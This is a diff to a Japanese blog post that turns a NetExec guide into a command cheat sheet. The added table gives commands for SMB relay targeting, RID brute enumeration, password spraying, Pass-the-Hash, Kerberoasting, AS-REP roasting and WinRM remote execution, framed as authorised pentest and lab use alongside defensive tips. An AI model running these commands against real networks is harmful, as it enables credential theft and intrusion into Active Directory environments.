@@ -1,11 +1,11 @@
 ---
-title: "NetExec (nxc) 入門実践ガイド"
+title: "NetExecコマンドチートシート — SMB/LDAP/WinRM/パスワードスプレー"
 date: 2026-03-04
 permalink: /ja/posts/tech-netexec-beginner-guide/
 legacy_permalink: /posts/tech-netexec-beginner-guide-ja/
-description: "NetExec（nxc）を初心者向けに詳しく解説。SMB/LDAP/WinRM 列挙、パスワードスプレー、リモート実行、実践ワークフローを Mermaid シーケンス図付きで整理。"
+description: "NetExec（nxc）のコマンドチートシート。SMB/LDAP/WinRM 列挙、パスワードスプレー、Pass-the-Hash、BloodHound 収集、SMBリレー準備を整理。"
 categories: [TechBlog]
-tags: [active-directory, netexec, smb, ldap, winrm, pentest, oscp]
+tags: [active-directory, netexec, nxc, smb, ldap, winrm, password-spraying, pass-the-hash, bloodhound, pentest, oscp, cheatsheet]
 mermaid: true
 content_lang: ja
 alt_en: /en/posts/tech-netexec-beginner-guide/
@@ -14,6 +14,24 @@ alt_en: /en/posts/tech-netexec-beginner-guide/
 ## TL;DR
 
 `NetExec`（`nxc`）は、内部ネットワークや Active Directory 評価で使う高速な検証・列挙フレームワークです。`smb`、`ldap`、`winrm` など複数プロトコルを同じ操作感で扱えるため、調査から有効認証情報の検証、次の行動決定までを一貫して進められます。初心者にとっての最大の利点は「コマンド体系の統一」で、基本パターンを覚えると実戦投入しやすい点です。
+
+以下のコマンドは、許可された検証環境またはラボでのみ使用してください。まず低負荷な探索、次にロックアウトポリシー確認、その後に失敗回数を制限した認証検証へ進めます。
+
+| 目的 | NetExec コマンド |
+|---|---|
+| SMB ホスト確認 | `nxc smb targets.txt` |
+| SMBリレー候補の抽出 | `nxc smb targets.txt --gen-relay-list no_signing_hosts.txt` |
+| パスワードポリシー確認 | `nxc smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol` |
+| 共有一覧の確認 | `nxc smb <TARGET> -u '<USER>' -p '<PASS>' --shares` |
+| RID brute でユーザー列挙 | `nxc smb <TARGET> -u 'guest' -p '' --rid-brute` |
+| 安全寄りのパスワードスプレー | `nxc smb targets.txt -u users.txt -p '<PASS>' --gfail-limit 5 --ufail-limit 2 --jitter 2` |
+| Pass-the-Hash 検証 | `nxc smb targets.txt -u '<USER>' -H '<NTHASH>' --continue-on-success` |
+| LDAP ユーザー/グループ/SID | `nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --users --groups --get-sid` |
+| Kerberoasting | `nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --kerberoasting kerberoast_hashes.txt` |
+| AS-REP roasting | `nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --asreproast asrep_hashes.txt` |
+| BloodHound 収集 | `nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' --bloodhound -c All` |
+| WinRM 接続確認 | `nxc winrm targets.txt -u '<USER>' -p '<PASS>'` |
+| リモート実行確認 | `nxc winrm <TARGET> -u '<USER>' -p '<PASS>' -x 'whoami && hostname'` |
 
 ---
 
@@ -294,6 +312,18 @@ sequenceDiagram
 - LDAP の短時間大量クエリを検知対象にする。
 - 可能な範囲で SMB Signing と適切なロックアウトポリシーを適用する。
 - 資格情報の使い回しを減らし、管理者権限を階層分離する。
+
+---
+
+## 関連記事
+
+- [AD CS ESC攻撃まとめ](/ja/posts/tech-adcs-esc-attack-guide/)
+- [Certipyを深掘りしてみた](/ja/posts/tech-certipy-adcs-attack/)
+- [ntlmrelayx.pyを深掘りしてみた](/ja/posts/tech-ntlmrelayx-attack-guide/)
+- [BloodHound Attack Pathチートシート](/ja/posts/tech-bloodhound-attack-paths/)
+- [Mimikatzコマンドチートシート](/ja/posts/tech-mimikatz-guide/)
+- [ラテラルムーブメントまとめ](/ja/posts/tech-lateral-movement-guide/)
+- [Windows権限昇格まとめ](/ja/posts/tech-windows-privesc-summary/)
 
 ---
 
